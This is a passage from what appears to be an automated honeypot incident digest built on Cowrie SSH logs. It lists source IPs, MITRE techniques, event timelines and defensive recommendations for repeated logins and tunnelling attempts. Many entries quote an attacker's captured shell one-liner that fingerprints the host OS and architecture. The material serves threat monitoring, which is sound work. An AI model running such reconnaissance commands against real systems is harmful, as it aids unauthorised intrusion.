| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:23:23` | `cowrie.session.connect` |
| `2026-07-26 04:23:23` | `cowrie.client.version` |
| `2026-07-26 04:23:23` | `cowrie.client.kex` |
| `2026-07-26 04:23:24` | `cowrie.login.success` |
| `2026-07-26 04:23:25` | `cowrie.session.params` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:25` | `cowrie.command.success` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:25` | `cowrie.command.input` |
| `2026-07-26 04:23:26` | `cowrie.log.closed` |
| `2026-07-26 04:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6578b7f3be85

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:24 |
| **Last Seen** | 2026-07-26 04:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:24:50` | `cowrie.session.connect` |
| `2026-07-26 04:24:50` | `cowrie.client.version` |
| `2026-07-26 04:24:50` | `cowrie.client.kex` |
| `2026-07-26 04:24:52` | `cowrie.login.success` |
| `2026-07-26 04:24:53` | `cowrie.session.params` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.command.success` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.command.input` |
| `2026-07-26 04:24:53` | `cowrie.log.closed` |
| `2026-07-26 04:24:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7539c6ee1ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:26 |
| **Last Seen** | 2026-07-26 04:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:26:19` | `cowrie.session.connect` |
| `2026-07-26 04:26:19` | `cowrie.client.version` |
| `2026-07-26 04:26:19` | `cowrie.client.kex` |
| `2026-07-26 04:26:20` | `cowrie.login.success` |
| `2026-07-26 04:26:22` | `cowrie.session.params` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.command.success` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.command.input` |
| `2026-07-26 04:26:22` | `cowrie.log.closed` |
| `2026-07-26 04:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f12845b7960

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:27 |
| **Last Seen** | 2026-07-26 04:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:27:47` | `cowrie.session.connect` |
| `2026-07-26 04:27:47` | `cowrie.client.version` |
| `2026-07-26 04:27:47` | `cowrie.client.kex` |
| `2026-07-26 04:27:49` | `cowrie.login.success` |
| `2026-07-26 04:27:49` | `cowrie.session.params` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:49` | `cowrie.command.success` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:49` | `cowrie.command.input` |
| `2026-07-26 04:27:50` | `cowrie.log.closed` |
| `2026-07-26 04:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46ce75e7a81c

| Field | Detail |
|---|---|
| **Source IP** | `116.114.94[.]242` |
| **First Seen** | 2026-07-26 04:29 |
| **Last Seen** | 2026-07-26 04:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:29:12` | `cowrie.session.connect` |
| `2026-07-26 04:29:13` | `cowrie.client.version` |
| `2026-07-26 04:29:13` | `cowrie.client.kex` |
| `2026-07-26 04:29:14` | `cowrie.login.success` |
| `2026-07-26 04:29:15` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.94[.]242` to AbuseIPDB if not already reported
- [ ] Block `116.114.94[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9d9428d0de8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:29 |
| **Last Seen** | 2026-07-26 04:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:29:20` | `cowrie.session.connect` |
| `2026-07-26 04:29:20` | `cowrie.client.version` |
| `2026-07-26 04:29:20` | `cowrie.client.kex` |
| `2026-07-26 04:29:21` | `cowrie.login.success` |
| `2026-07-26 04:29:22` | `cowrie.session.params` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:22` | `cowrie.command.success` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:22` | `cowrie.command.input` |
| `2026-07-26 04:29:23` | `cowrie.log.closed` |
| `2026-07-26 04:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eab163dd027

| Field | Detail |
|---|---|
| **Source IP** | `200.159.14[.]187` |
| **First Seen** | 2026-07-26 04:29 |
| **Last Seen** | 2026-07-26 04:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:29:24` | `cowrie.session.connect` |
| `2026-07-26 04:29:25` | `cowrie.client.version` |
| `2026-07-26 04:29:25` | `cowrie.client.kex` |
| `2026-07-26 04:29:27` | `cowrie.login.success` |
| `2026-07-26 04:29:27` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.159.14[.]187` to AbuseIPDB if not already reported
- [ ] Block `200.159.14[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3cbb4289aa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:31 |
| **Last Seen** | 2026-07-26 04:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:31:03` | `cowrie.session.connect` |
| `2026-07-26 04:31:04` | `cowrie.client.version` |
| `2026-07-26 04:31:04` | `cowrie.client.kex` |
| `2026-07-26 04:31:05` | `cowrie.login.success` |
| `2026-07-26 04:31:06` | `cowrie.session.params` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.command.success` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.command.input` |
| `2026-07-26 04:31:06` | `cowrie.log.closed` |
| `2026-07-26 04:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f212464a76

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:32 |
| **Last Seen** | 2026-07-26 04:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:32:46` | `cowrie.session.connect` |
| `2026-07-26 04:32:46` | `cowrie.client.version` |
| `2026-07-26 04:32:46` | `cowrie.client.kex` |
| `2026-07-26 04:32:48` | `cowrie.login.success` |
| `2026-07-26 04:32:49` | `cowrie.session.params` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.command.success` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.command.input` |
| `2026-07-26 04:32:49` | `cowrie.log.closed` |
| `2026-07-26 04:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa86d465695e

| Field | Detail |
|---|---|
| **Source IP** | `213.101.138[.]172` |
| **First Seen** | 2026-07-26 04:34 |
| **Last Seen** | 2026-07-26 04:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:34:09` | `cowrie.session.connect` |
| `2026-07-26 04:34:09` | `cowrie.client.version` |
| `2026-07-26 04:34:09` | `cowrie.client.kex` |
| `2026-07-26 04:34:10` | `cowrie.login.success` |
| `2026-07-26 04:34:11` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.101.138[.]172` to AbuseIPDB if not already reported
- [ ] Block `213.101.138[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7d0f4903b5b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:34 |
| **Last Seen** | 2026-07-26 04:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:34:23` | `cowrie.session.connect` |
| `2026-07-26 04:34:24` | `cowrie.client.version` |
| `2026-07-26 04:34:24` | `cowrie.client.kex` |
| `2026-07-26 04:34:25` | `cowrie.login.success` |
| `2026-07-26 04:34:26` | `cowrie.session.params` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.command.success` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.command.input` |
| `2026-07-26 04:34:26` | `cowrie.log.closed` |
| `2026-07-26 04:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664d13c85f59

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:35 |
| **Last Seen** | 2026-07-26 04:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:35:59` | `cowrie.session.connect` |
| `2026-07-26 04:36:00` | `cowrie.client.version` |
| `2026-07-26 04:36:00` | `cowrie.client.kex` |
| `2026-07-26 04:36:01` | `cowrie.login.success` |
| `2026-07-26 04:36:01` | `cowrie.session.params` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.command.success` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.command.input` |
| `2026-07-26 04:36:01` | `cowrie.log.closed` |
| `2026-07-26 04:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c7f81103964

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-07-26 04:37 |
| **Last Seen** | 2026-07-26 04:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:37:27` | `cowrie.session.connect` |
| `2026-07-26 04:37:28` | `cowrie.client.version` |
| `2026-07-26 04:37:28` | `cowrie.client.kex` |
| `2026-07-26 04:37:29` | `cowrie.login.success` |
| `2026-07-26 04:37:29` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fccd4c8ccb2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:37 |
| **Last Seen** | 2026-07-26 04:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:37:37` | `cowrie.session.connect` |
| `2026-07-26 04:37:38` | `cowrie.client.version` |
| `2026-07-26 04:37:38` | `cowrie.client.kex` |
| `2026-07-26 04:37:38` | `cowrie.login.success` |
| `2026-07-26 04:37:39` | `cowrie.session.params` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.command.success` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.command.input` |
| `2026-07-26 04:37:39` | `cowrie.log.closed` |
| `2026-07-26 04:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-304f4d20914a

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]228` |
| **First Seen** | 2026-07-26 04:37 |
| **Last Seen** | 2026-07-26 04:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:37:39` | `cowrie.session.connect` |
| `2026-07-26 04:37:39` | `cowrie.client.version` |
| `2026-07-26 04:37:39` | `cowrie.client.kex` |
| `2026-07-26 04:37:41` | `cowrie.login.success` |
| `2026-07-26 04:37:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]228` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e065469ce7a2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:39 |
| **Last Seen** | 2026-07-26 04:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
